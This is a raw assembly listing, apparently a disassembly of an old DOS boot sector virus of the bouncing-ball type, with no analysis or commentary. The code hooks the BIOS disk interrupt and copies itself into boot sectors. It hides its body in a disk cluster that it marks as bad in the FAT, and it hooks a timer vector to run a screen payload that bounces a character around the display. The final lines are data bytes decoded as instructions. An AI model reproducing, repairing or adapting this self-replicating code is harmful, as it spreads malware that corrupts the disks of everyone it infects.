		jmp	short loc_3
		nop
		dec	cx
		inc	dx
		dec	bp
		and	[bx+si],ah
		xor	bp,data_10
		add	al,[si]
data_14 	dw	1
		add	al,[bx+si]
		add	bh,[bp+di]
		mov	data_12,al
		add	[bx+di],dl
		add	[si],al
		add	[bx+di],dl
		add	[bp+di],dh
loc_3:
		xor	ax,ax
		mov	ss,ax
		mov	sp,7C00h
		mov	ds,ax
		mov	ax,data_5
		sub	ax,2
		mov	data_5,ax
		mov	cl,6
		shl	ax,cl				; Shift w/zeros fill
		sub	ax,7C0h
		mov	es,ax
		mov	si,7C00h
		mov	di,si
		mov	cx,100h
		rep	movsw				; Rep while cx>0 Mov [si] to es:[di]
		db	8Eh
		db	0C8h
		push	cs
		pop	ds
		call	sub_1

;==========================================================================
;			       SUBROUTINE
;==========================================================================

sub_1		proc	near
		xor	ah,ah				; Zero register
		int	13h				; Disk	dl=drive b: ah=func 00h
							;  reset disk, al=return status
		and	data_24,80h
		mov	bx,data_25
		push	cs
		pop	ax
		sub	ax,20h
		mov	es,ax
		call	sub_3
		mov	bx,data_25
		inc	bx
		mov	ax,0FFC0h
		mov	es,ax
		call	sub_3
		xor	ax,ax				; Zero register
		mov	data_23,al
		mov	ds,ax
		mov	ax,data_3
		mov	bx,data_4
		mov	data_3,7CD0h
		mov	data_4,cs
		push	cs
		pop	ds
		mov	data_19,ax
		mov	data_20,bx
		mov	dl,data_24
		jmp	far ptr loc_2
sub_1		endp


;==========================================================================
;			       SUBROUTINE
;==========================================================================

sub_2		proc	near
		mov	ax,301h
		jmp	short loc_4

;==== External Entry into Subroutine ======================================

sub_3:
		mov	ax,201h
loc_4:
		xchg	ax,bx
		add	ax,data_18
		xor	dx,dx				; Zero register
		div	data_16 			; ax,dxrem=dx:ax/data
		inc	dl
		mov	ch,dl
		xor	dx,dx				; Zero register
		div	data_17 			; ax,dxrem=dx:ax/data
		mov	cl,6
		shl	ah,cl				; Shift w/zeros fill
		or	ah,ch
		mov	cx,ax
		xchg	ch,cl
		mov	dh,dl
		mov	ax,bx

;==== External Entry into Subroutine ======================================

sub_4:
		mov	dl,data_24
		mov	bx,8000h
		int	13h				; Disk	dl=drive b: ah=func 02h
							;  read sectors to memory es:bx
		jnc	loc_ret_5			; Jump if carry=0
		pop	ax

loc_ret_5:
		retn
sub_2		endp

		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	cs
		pop	ds
		push	cs
		pop	es
		test	data_23,1
		jnz	loc_8				; Jump if not zero
		cmp	ah,2
		jne	loc_8				; Jump if not equal
		cmp	data_24,dl
		mov	data_24,dl
		jnz	loc_7				; Jump if not zero
		xor	ah,ah				; Zero register
		int	1Ah				; Real time clock   ah=func 00h
							;  get system timer count cx,dx
		test	dh,7Fh
		jnz	loc_6				; Jump if not zero
		test	dl,0F0h
		jnz	loc_6				; Jump if not zero
		push	dx
		call	sub_6
		pop	dx
loc_6:
		mov	cx,dx
		sub	dx,data_26
		mov	data_26,cx
		sub	dx,24h
		jc	loc_8				; Jump if carry Set
loc_7:
		or	data_23,1
		push	si
		push	di
		call	sub_5
		pop	di
		pop	si
		and	data_23,0FEh
loc_8:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		jmp	far ptr loc_38

;==========================================================================
;			       SUBROUTINE
;==========================================================================

sub_5		proc	near
		mov	ax,201h
		mov	dh,0
		mov	cx,1
		call	sub_4
		test	data_24,80h
		jz	loc_11				; Jump if zero
		mov	si,81BEh
		mov	cx,4

locloop_9:
		cmp	data_8[si],1
		je	loc_10				; Jump if equal
		cmp	data_8[si],4
		je	loc_10				; Jump if equal
		add	si,10h
		loop	locloop_9			; Loop if cx > 0

		retn
loc_10:
		mov	dx,[si]
		mov	cx,data_7[si]
		mov	ax,201h
		call	sub_4
loc_11:
		mov	si,8002h
		mov	di,7C02h
		mov	cx,1Ch
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		cmp	data_46,1357h
		jne	loc_13				; Jump if not equal
		cmp	data_45,0
		jae	loc_ret_12			; Jump if above or =
		mov	ax,data_43
		mov	data_22,ax
		mov	si,data_44
		jmp	loc_23

loc_ret_12:
		retn
loc_13:
		cmp	data_37,200h
		jne	loc_ret_12			; Jump if not equal
		cmp	data_38,2
		jb	loc_ret_12			; Jump if below
		mov	cx,data_39
		mov	al,data_40
		cbw					; Convrt byte to word
		mul	data_42 			; ax = data * ax
		add	cx,ax
		mov	ax,20h
		mul	data_41 			; ax = data * ax
		add	ax,1FFh
		mov	bx,200h
		div	bx				; ax,dx rem=dx:ax/reg
		add	cx,ax
		mov	data_22,cx
		mov	ax,data_15
		sub	ax,data_22
		mov	bl,data_13
		xor	dx,dx				; Zero register
		xor	bh,bh				; Zero register
		div	bx				; ax,dx rem=dx:ax/reg
		inc	ax
		mov	di,ax
		and	data_23,0FBh
		cmp	ax,0FF0h
		jbe	loc_14				; Jump if below or =
		or	data_23,4
loc_14:
		mov	si,1
		mov	bx,data_14
		dec	bx
		mov	data_21,bx
		mov	data_27,0FEh
		jmp	short loc_15
data_21 	dw	1Ah
data_22 	dw	73h
data_23 	db	4
data_24 	db	81h
data_25 	dw	654Bh
		add	data_9[bx],dl
		push	bp
		stosb					; Store al to es:[di]
loc_15:
		inc	data_21
		mov	bx,data_21
		add	data_27,2
		call	sub_3
		jmp	short loc_20
loc_16:
		mov	ax,3
		test	data_23,4
		jz	loc_17				; Jump if zero
		inc	ax
loc_17:
		mul	si				; dx:ax = reg * ax
		shr	ax,1				; Shift w/zeros fill
		sub	ah,data_27
		mov	bx,ax
		cmp	bx,1FFh
		jae	loc_15				; Jump if above or =
		mov	dx,data_36[bx]
		test	data_23,4
		jnz	loc_19				; Jump if not zero
		mov	cl,4
		test	si,1
		jz	loc_18				; Jump if zero
		shr	dx,cl				; Shift w/zeros fill
loc_18:
		and	dh,0Fh
loc_19:
		test	dx,0FFFFh
		jz	loc_21				; Jump if zero
loc_20:
		inc	si
		cmp	si,di
		jbe	loc_16				; Jump if below or =
		retn
loc_21:
		mov	dx,0FFF7h
		test	data_23,4
		jnz	loc_22				; Jump if not zero
		and	dh,0Fh
		mov	cl,4
		test	si,1
		jz	loc_22				; Jump if zero
		shl	dx,cl				; Shift w/zeros fill
loc_22:
		or	data_36[bx],dx
		mov	bx,data_21
		call	sub_2
		mov	ax,si
		sub	ax,2
		mov	bl,data_13
		xor	bh,bh				; Zero register
		mul	bx				; dx:ax = reg * ax
		add	ax,data_22
		mov	si,ax
		mov	bx,0
		call	sub_3
		mov	bx,si
		inc	bx
		call	sub_2
loc_23:
		mov	bx,si
		mov	data_25,si
		push	cs
		pop	ax
		sub	ax,20h
		mov	es,ax
		call	sub_2
		push	cs
		pop	ax
		sub	ax,40h
		mov	es,ax
		mov	bx,0
		call	sub_2
		retn
sub_5		endp

data_26 	dw	246Eh
data_27 	db	32h

;==========================================================================
;			       SUBROUTINE
;==========================================================================

sub_6		proc	near
		test	data_23,2
		jnz	loc_ret_24			; Jump if not zero
		or	data_23,2
		mov	ax,0
		mov	ds,ax
		mov	ax,data_1
		mov	bx,data_2
		mov	data_1,7EDFh
		mov	data_2,cs
		push	cs
		pop	ds
		mov	data_28,ax
		mov	data_29,bx

loc_ret_24:
		retn
sub_6		endp

		push	ds
		push	ax
		push	bx
		push	cx
		push	dx
		push	cs
		pop	ds
		mov	ah,0Fh
		int	10h				; Video display   ah=functn 0Fh
							;  get state, al=mode, bh=page
		mov	bl,al
		cmp	bx,data_34
		je	loc_27				; Jump if equal
		mov	data_34,bx
		dec	ah
		mov	data_35,ah
		mov	ah,1
		cmp	bl,7
		jne	loc_25				; Jump if not equal
		dec	ah
loc_25:
		cmp	bl,4
		jae	loc_26				; Jump if above or =
		dec	ah
loc_26:
		mov	data_33,ah
		mov	data_31,101h
		mov	data_32,101h
		mov	ah,3
		int	10h				; Video display   ah=functn 03h
							;  get cursor loc in dx, mode cx
		push	dx
		mov	dx,data_31
		jmp	short loc_29
loc_27:
		mov	ah,3
		int	10h				; Video display   ah=functn 03h
							;  get cursor loc in dx, mode cx
		push	dx
		mov	ah,2
		mov	dx,data_31
		int	10h				; Video display   ah=functn 02h
							;  set cursor location in dx
		mov	ax,data_30
		cmp	data_33,1
		jne	loc_28				; Jump if not equal
		mov	ax,8307h
loc_28:
		mov	bl,ah
		mov	cx,1
		mov	ah,9
		int	10h				; Video display   ah=functn 09h
							;  set char al & attrib ah @curs
loc_29:
		mov	cx,data_32
		cmp	dh,0
		jne	loc_30				; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_30:
		cmp	dh,18h
		jne	loc_31				; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_31:
		cmp	dl,0
		jne	loc_32				; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_32:
		cmp	dl,data_35
		jne	loc_33				; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_33:
		cmp	cx,data_32
		jne	loc_35				; Jump if not equal
		mov	ax,data_30
		and	al,7
		cmp	al,3
		jne	loc_34				; Jump if not equal
		xor	ch,0FFh
		inc	ch
loc_34:
		cmp	al,5
		jne	loc_35				; Jump if not equal
		xor	cl,0FFh
		inc	cl
loc_35:
		add	dl,cl
		add	dh,ch
		mov	data_32,cx
		mov	data_31,dx
		mov	ah,2
		int	10h				; Video display   ah=functn 02h
							;  set cursor location in dx
		mov	ah,8
		int	10h				; Video display   ah=functn 08h
							;  get char al & attrib ah @curs
		mov	data_30,ax
		mov	bl,ah
		cmp	data_33,1
		jne	loc_36				; Jump if not equal
		mov	bl,83h
loc_36:
		mov	cx,1
		mov	ax,907h
		int	10h				; Video display   ah=functn 09h
							;  set char al & attrib ah @curs
		pop	dx
		mov	ah,2
		int	10h				; Video display   ah=functn 02h
							;  set cursor location in dx
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	ds
		jmp	far ptr loc_1
data_30 	dw	0
data_31 	dw	101h
data_32 	dw	101h
data_33 	db	0
data_34 	dw	0FFFFh
data_35 	db	50h
		mov	bh,0B7h
		mov	bh,0B6h
		inc	ax
		inc	ax
		mov	dh,bl
		out	5Ah,al				; port 5Ah
		lodsb					; String [si] to al
		shl	ah,cl				; Shift w/zeros fill
		jmp	far ptr loc_39
		inc	ax
		db	64h
		pop	sp
		db	60h
		push	dx
		inc	ax
		inc	ax
		inc	ax
		inc	ax
		db	64h
		db	62h
		pop	si
		db	62h
		db	60h
		pop	si
		jo	loc_37				; Jump if overflow=1
		inc	ax
		inc	cx
		mov	bh,0B7h
		mov	bh,0B6h

